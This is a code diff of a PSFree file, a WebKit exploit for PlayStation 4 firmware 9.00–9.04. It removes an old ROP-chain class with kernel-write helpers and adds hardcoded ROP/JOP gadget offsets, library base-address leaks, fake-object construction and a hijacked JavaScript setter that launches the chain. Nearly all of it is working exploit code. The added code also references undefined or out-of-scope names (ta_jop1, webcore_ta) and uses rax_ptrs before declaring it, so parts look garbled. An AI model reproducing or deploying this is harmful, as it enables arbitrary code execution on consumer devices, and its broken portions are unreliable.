@@ -1,184 +1,261 @@
-const stack_sz = 0x40000;
-const reserve_upper_stack = 0x10000;
-const stack_reserved_idx = reserve_upper_stack / 4;
+/* Copyright (C) 2023-2025 anonymous
+
+This file is part of PSFree.
+
+PSFree is free software: you can redistribute it and/or modify
+it under the terms of the GNU Affero General Public License as
+published by the Free Software Foundation, either version 3 of the
+License, or (at your option) any later version.
+
+PSFree is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU Affero General Public License for more details.
+
+You should have received a copy of the GNU Affero General Public License
+along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
+
+// 9.00, 9.03, 9.04
+
+import { mem } from '../../module/mem.mjs';
+import { KB } from '../../module/offset.mjs';
+import { ChainBase, get_gadget } from '../../module/chain.mjs';
+import { BufferView } from '../../module/rw.mjs';
+
+import {
+    get_view_vector,
+    resolve_import,
+    init_syscall_array,
+} from '../../module/memtools.mjs';
+
+import * as off from '../../module/offset.mjs';
+
+// WebKit offsets of imported functions
+const offset_wk_stack_chk_fail = 0x178;
+const offset_wk_strlen = 0x198;
+
+// libSceNKWebKit.sprx
+export let libwebkit_base = null;
+// libkernel_web.sprx
+export let libkernel_base = null;
+// libSceLibcInternal.sprx
+export let libc_base = null;
+
+const ta_jop2 = `
+pop rsi
+jmp qword ptr [rax + 0x1c]
+`;
+const ta_jop3 = `
+mov rdi, qword ptr [rax + 8]
+mov rax, qword ptr [rdi]
+jmp qword ptr [rax + 0x30]
+`;
+
+const jop2 = `
+push rbp
+mov rbp, rsp
+mov rax, qword ptr [rdi]
+call qword ptr [rax + 0x58]
+`;
+const jop3 = `
+mov rdx, qword ptr [rax + 0x18]
+mov rax, qword ptr [rdi]
+call qword ptr [rax + 0x10]
+`;
+const jop4 = `
+push rdx
+jmp qword ptr [rax]
+`;
+const jop5 = 'pop rsp; ret';
+
+const webkit_gadget_offsets = new Map(Object.entries({
+    'pop rax; ret' : 0x0000000000051a12, // `58 c3`
+    'pop rbx; ret' : 0x00000000000be5d0, // `5b c3`
+    'pop rcx; ret' : 0x00000000000657b7, // `59 c3`
+    'pop rdx; ret' : 0x000000000000986c, // `5a c3`
+
+    'pop rbp; ret' : 0x00000000000000b6, // `5d c3`
+    'pop rsi; ret' : 0x000000000001f4d6, // `5e c3`
+    'pop rdi; ret' : 0x0000000000319690, // `5f c3`
+    'pop rsp; ret' : 0x000000000004e293, // `5c c3`
+
+    'pop r8; ret' : 0x00000000001a7ef1, // `47 58 c3`
+    'pop r9; ret' : 0x0000000000422571, // `47 59 c3`
+    'pop r10; ret' : 0x0000000000e9e1d1, // `47 5a c3`
+    'pop r11; ret' : 0x00000000012b1d51, // `47 5b c3`
+
+    'pop r12; ret' : 0x000000000085ec71, // `47 5c c3`
+    'pop r13; ret' : 0x00000000001da461, // `47 5d c3`
+    'pop r14; ret' : 0x0000000000685d73, // `47 5e c3`
+    'pop r15; ret' : 0x00000000006ab3aa, // `47 5f c3`
+
+    'ret' : 0x0000000000000032, // `c3`
+    'leave; ret' : 0x000000000008db5b, // `c9 c3`
+
+    'mov rax, qword ptr [rax]; ret' : 0x00000000000241cc, // `48 8b 00 c3`
+    'mov qword ptr [rdi], rax; ret' : 0x000000000000613b, // `48 89 07 c3`
+    'mov dword ptr [rdi], eax; ret' : 0x000000000000613c, // `89 07 c3`
+    'mov dword ptr [rax], esi; ret' : 0x00000000005c3482, // `89 30 c3`
+
+     [jop2] : 0x0000000000683800,
+    [jop3] : 0x0000000000303906,
+    [jop4] : 0x00000000028bd332,
 
 
-// Class for quickly creating and managing a ROP chain
-window.rop = function () {
-    this.stackback = p.malloc32(stack_sz / 4 + 0x8);
-    this.stack = this.stackback.add32(reserve_upper_stack);
-    this.stack_array = this.stackback.backing;
-    this.retval = this.stackback.add32(stack_sz);
-    this.count = 1;
-    this.branches_count = 0;
-    this.branches_rsps = p.malloc(0x200);
+    [ta_jop1] : 0x00000000004e62a4,
+    [ta_jop2] : 0x00000000021fce7e,
+    [ta_jop3] : 0x00000000019becb4,
+    [jop5] : 0x000000000004E293,
+}));
 
-    this.clear = function () {
-        this.count = 1;
-        this.branches_count = 0;
+const libc_gadget_offsets = new Map(Object.entries({
+    'getcontext' : 0x24f04,
+    'setcontext' : 0x29448,
+}));
 
-        for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
-            this.stack_array[i + stack_reserved_idx] = 0;
-        }
-    };
+const libkernel_gadget_offsets = new Map(Object.entries({
+    // returns the location of errno
+    '__error' : 0xCB80,
+}));
 
-    this.pushSymbolic = function () {
-        this.count++;
-        return this.count - 1;
+export const gadgets = new Map();
+
+function get_bases() {
+    const textarea = document.createElement('textarea');
+    const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
+    const textarea_vtable = webcore_textarea.readp(0);
+    const off_ta_vt = 0x2e73c18;
+    const libwebkit_base = textarea_vtable.sub(off_ta_vt);
+
+    const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
+    const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
+    const off_scf = 0x1ff60;
+    const libkernel_base = stack_chk_fail_addr.sub(off_scf);
+
+    const strlen_import = libwebkit_base.add(offset_wk_strlen);
+    const strlen_addr = resolve_import(strlen_import);
+    const off_strlen = 0x4fa40;
+    const libc_base = strlen_addr.sub(off_strlen);
+
+    return [
+        libwebkit_base,
+        libkernel_base,
+        libc_base,
+    ];
+}
+
+export function init_gadget_map(gadget_map, offset_map, base_addr) {
+    for (const [insn, offset] of offset_map) {
+        gadget_map.set(insn, base_addr.add(offset));
+    }
+}
+
+class Chain900Base extends ChainBase {
+    push_end() {
+        this.push_gadget('leave; ret');
     }
 
-    this.finalizeSymbolic = function (idx, val) {
-        if (val instanceof int64) {
-            this.stack_array[stack_reserved_idx + idx * 2] = val.low;
-            this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
-        } else {
-            this.stack_array[stack_reserved_idx + idx * 2] = val;
-            this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
-        }
+    push_get_retval() {
+        this.push_gadget('pop rdi; ret');
+        this.push_value(this.retval_addr);
+        this.push_gadget('mov qword ptr [rdi], rax; ret');
     }
 
-    this.push = function (val) {
-        this.finalizeSymbolic(this.pushSymbolic(), val);
+    push_get_errno() {
+        this.push_gadget('pop rdi; ret');
+        this.push_value(this.errno_addr);
+
+        this.push_call(this.get_gadget('__error'));
+
+        this.push_gadget('mov rax, qword ptr [rax]; ret');
+        this.push_gadget('mov dword ptr [rdi], eax; ret');
     }
 
-    this.push_write8 = function (where, what) {
-        this.push(gadgets["pop rdi"]);
-        this.push(where);
-        this.push(gadgets["pop rsi"]);
-        this.push(what);
-        this.push(gadgets["mov [rdi], rsi"]);
+    push_clear_errno() {
+        this.push_call(this.get_gadget('__error'));
+        this.push_gadget('pop rsi; ret');
+        this.push_value(0);
+        this.push_gadget('mov dword ptr [rax], esi; ret');
+    }
+}
+
+export class Chain900 extends Chain900Base {
+    constructor() {
+        super();
+        const [rdx, rdx_bak] = mem.gc_alloc(0x58);
+        rdx.write64(off.js_cell, this._empty_cell);
+        rdx.write64(0x50, this.stack_addr);
+        this._rsp = mem.fakeobj(rdx);
     }
 
-    this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
-        if (rdi != undefined) {
-            this.push(gadgets["pop rdi"]);
-            this.push(rdi);
-        }
-
-        if (rsi != undefined) {
-            this.push(gadgets["pop rsi"]);
-            this.push(rsi);
-        }
-
-        if (rdx != undefined) {
-            this.push(gadgets["pop rdx"]);
-            this.push(rdx);
-        }
-
-        if (rcx != undefined) {
-            this.push(gadgets["pop rcx"]);
-            this.push(rcx);
-        }
-
-        if (r8 != undefined) {
-            this.push(gadgets["pop r8"]);
-            this.push(r8);
-        }
-
-        if (r9 != undefined) {
-            this.push(gadgets["pop r9"]);
-            this.push(r9);
-        }
-
-        if (this.stack.add32(this.count * 0x8).low & 0x8) {
-            this.push(gadgets["ret"]);
-        }
-
-        this.push(rip);
-        return this;
+    run() {
+        this.check_allow_run();
+        this._rop.launch = this._rsp;
+        this.dirty();
     }
+}
 
-    this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
-        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
-        this.write_result(this.retval);
-        this.run();
-        return p.read8(this.retval);
-    }
+export const Chain = Chain900;
 
-    this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
-        return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
-    }
+export function init(Chain) {
+    const syscall_array = [];
+    [libwebkit_base, libkernel_base, libc_base] = get_bases();
 
-    //get rsp of the next push
-    this.get_rsp = function () {
-        return this.stack.add32(this.count * 8);
-    }
-    this.write_result = function (where) {
-        this.push(gadgets["pop rdi"]);
-        this.push(where);
-        this.push(gadgets["mov [rdi], rax"]);
-    }
-    this.write_result4 = function (where) {
-        this.push(gadgets["pop rdi"]);
-        this.push(where);
-        this.push(gadgets["mov [rdi], eax"]);
-    }
+    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
+    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
+    init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
+    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
 
-    this.jmp_rsp = function (rsp) {
-        this.push(window.gadgets["pop rsp"]);
-        this.push(rsp);
-    }
+    let gs = Object.getOwnPropertyDescriptor(window, 'location').set;
+    // JSCustomGetterSetter.m_getterSetter
+    gs = mem.addrof(gs).readp(0x28);
 
-    this.run = function () {
-        p.launch_chain(this);
-        this.clear();
-    }
+    // sizeof JSC::CustomGetterSetter
+    const size_cgs = 0x18;
+    const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
+    mem.cpy(gc_buf, gs, size_cgs);
+    // JSC::CustomGetterSetter.m_setter
+   // gc_buf.write64(0x10, get_gadget(gadgets, jop1));
 
-    this.KERNEL_BASE_PTR_VAR;
-    this.set_kernel_var = function (arg) {
-        this.KERNEL_BASE_PTR_VAR = arg;
-    }
 
-    this.rax_kernel = function (offset) {
-        this.push(gadgets["pop rax"]);
-        this.push(this.KERNEL_BASE_PTR_VAR)
-        this.push(gadgets["mov rax, [rax]"]);
-        this.push(gadgets["pop rsi"]);
-        this.push(offset)
-        this.push(gadgets["add rax, rsi"]);
-    }
+    
+    const proto = Chain.prototype;
+    // _rop must have a descriptor initially in order for the structure to pass
+    // setHasReadOnlyOrGetterSetterPropertiesExcludingProto() thus forcing a
+    // call to JSObject::putInlineSlow(). putInlineSlow() is the code path that
+    // checks for any descriptor to run
+    //
+    // the butterfly's indexing type must be something the GC won't inspect
+    // like DoubleShape. it will be used to store the JOP table's pointer
+    const _rop = {get launch() {throw Error('never call')}, 0: 1.1};
+    // replace .launch with the actual custom getter/setter
+    mem.addrof(_rop).write64(off.js_inline_prop, gc_buf);
+    proto._rop = _rop;
+    const vtable = new Uint8Array(0x200);
+        const old_vtable_p = webcore_ta.readp(0);
+        this.vtable = vtable;
+        this.old_vtable_p = old_vtable_p;
 
-    this.write_kernel_addr_to_chain_later = function (offset) {
-        this.push(gadgets["pop rdi"]);
-        var idx = this.pushSymbolic();
-        this.rax_kernel(offset);
-        this.push(gadgets["mov [rdi], rax"]);
-        return idx;
-    }
+      
+        rax_ptrs.write64(vtable, 0x1b8, this.get_gadget(ta_jop1));
+       rax_ptrs.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
+        rax_ptrs.write64(vtable, 0x1c, this.get_gadget(ta_jop3));
+    
+    // JOP table
+    const rax_ptrs = new BufferView(0x100);
+    const rax_ptrs_p = get_view_vector(rax_ptrs);
+    proto._rax_ptrs = rax_ptrs;
 
-    this.kwrite8 = function (offset, qword) {
-        this.rax_kernel(offset);
-        this.push(gadgets["pop rsi"]);
-        this.push(qword);
-        this.push(gadgets["mov [rax], rsi"]);
-    }
+    rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
+    rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
+    rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
+    rax_ptrs.write64(0, get_gadget(gadgets, jop5));
 
-    this.kwrite4 = function (offset, dword) {
-        this.rax_kernel(offset);
-        this.push(gadgets["pop rdx"]);
-        this.push(dword);
-        this.push(gadgets["mov [rax], edx"]);
-    }
+    const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
+    jop_buffer_p.write64(0, rax_ptrs_p);
 
-    this.kwrite2 = function (offset, word) {
-        this.rax_kernel(offset);
-        this.push(gadgets["pop rcx"]);
-        this.push(word);
-        this.push(gadgets["mov [rax], cx"]);
-    }
+    const empty = {};
+    proto._empty_cell = mem.addrof(empty).read64(off.js_cell);
 
-    this.kwrite1 = function (offset, byte) {
-        this.rax_kernel(offset);
-        this.push(gadgets["pop rcx"]);
-        this.push(byte);
-        this.push(gadgets["mov [rax], cl"]);
-    }
-
-    this.kwrite8_kaddr = function (offset1, offset2) {
-        this.rax_kernel(offset2);
-        this.push(gadgets["mov rdx, rax"]);
-        this.rax_kernel(offset1);
-        this.push(gadgets["mov [rax], rdx"]);
-    }
-    return this;
-};
+    Chain.init_class(gadgets, syscall_array);
+}
